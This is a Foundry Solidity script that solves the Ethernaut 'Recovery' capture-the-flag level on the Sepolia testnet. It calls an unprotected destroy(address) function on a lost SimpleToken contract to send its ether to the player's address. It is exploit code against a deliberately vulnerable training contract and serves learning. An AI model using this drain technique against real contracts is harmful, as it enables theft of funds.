// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Recovery} from "../src/Recovery.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/Recovery.s.sol --tc RecoverySolution --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv

contract RecoverySolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    address myAddress = vm.envAddress("MY_ADDRESS");
    // this is the instance address created by the ethernaut contract
    address public instance = payable(vm.envAddress("SIMPLETOKEN_INSTANCE"));

    // attack idea: the generateToken function creates a new SimpleToken contract with the name and initial supply
    // to get the address of the SimpleToken contract we can use the etherscan API to get the address of the contract
    // and then call the destroy function to destroy the contract and send the ether to the address of our choice

    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        instance.call(abi.encodeWithSignature("destroy(address)", myAddress));
        require(address(instance).balance == 0, "The balance of the instance should be 0");
        vm.stopBroadcast();
    }

}